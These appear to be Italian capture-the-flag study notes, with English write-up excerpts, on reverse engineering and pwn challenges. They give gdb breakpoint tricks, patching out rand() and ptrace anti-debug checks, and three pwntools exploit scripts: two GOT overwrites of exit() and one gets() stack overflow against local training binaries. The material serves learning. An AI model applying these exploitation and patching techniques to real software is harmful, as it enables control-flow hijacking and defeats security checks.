### Soluzioni 
Se la soluzione é mettere un breakpoint per evitare la eliminazione di qualcosa
si fa prima:
```bash
info registers
```
si cerca quando viene messa la flag nel rax poi si fa:
```bash
break * 0xindirizzo
```
successivamente si vede se nel rax c'è qualcosa e poi si fa:
```bash
x/s $rax
```

Nel caso in cui ci sono variabili che vengono calcolate con *rand*:

Si scrive al posto della chiamata *_rand* un registro *$+5* oppure *mov eax, 0*

il write esempio:
For the first question, we can see with ida that the correct input is: `Anya Forger, Park Avenue 128`. 

The second and the third question is asked to enter a digit from 0 to 9, where the correct answer is always different. This result, is decided in `think()` function, that use a `rand()` to generate random numbers. What we can do replace the rand() function, with a register, where the value stored is fixed. In this way, the number that the function `think()` returns is always the same: 1.

Per evitare i casi di security check, si mette al posto di _ptrace, 5 nop;

PER PWN:

Se viene chiesto di sovrascrivere la funzione di exit per arrivare alla funzione di flag:

```python
from pwn import *

context.binary = "./goat"
p = process()

p.sendline(hex(context.binary.got["exit"]).encode("ascii"))
p.sendline(hex(context.binary.functions["win"].address).encode("ascii"))
p.interactive()
```

Un altro esempio:
The binary provides a trivial write-what-where so it would be a good idea to overwrite some entry in the GOT in order to get control of the program control flow.
A good candidate for the overwrite would be (as usual) the `exit()` function.
The function that (sort of) gives us the flag is `give_the_man_a_cat()` but it's never called anywhere.
By overwriting the GOT entry for `exit()` we can call the required function and get the flag.

```python
from pwn import *  

context.binary = "./NeedsToBeHappy"
e: ELF = context.binary 
p = process()
p.sendline(b"y")
p.sendline(str(e.functions["give_the_man_a_cat"].address).encode("ascii"))
p.sendline(str(e.got["exit"]).encode("ascii"))
p.interactive()
```
Per il caso invece in cui bisogna sovrascrivere le variabili dello stack con un valore corretto: In onlineDate ad esempio quello di Gerard_Pique
We have a trivial buffer overflow vulnerability, we just need to overwrite some stack variables with the correct values.
The input length isn't checked due to the use of `gets()` for handling user input, the target buffer is 56 bytes long, its content aren't checked against anything so we can just fill it with `A`s.
The only important thing here is overwriting the variables with the correct value and in the correct order (that's easily checked by looking at the variables position in the stack).

```python
from pwn import *

payload = b'A'* 56 + b'Gerard_Pique' + b'Clara_C.' + b'TwingoOo' + b'CasioOo!'

r = process('./onlineDating')
r.sendlineafter(b'Please tell us how to update it (max 50 char):', payload)
r.interactive()
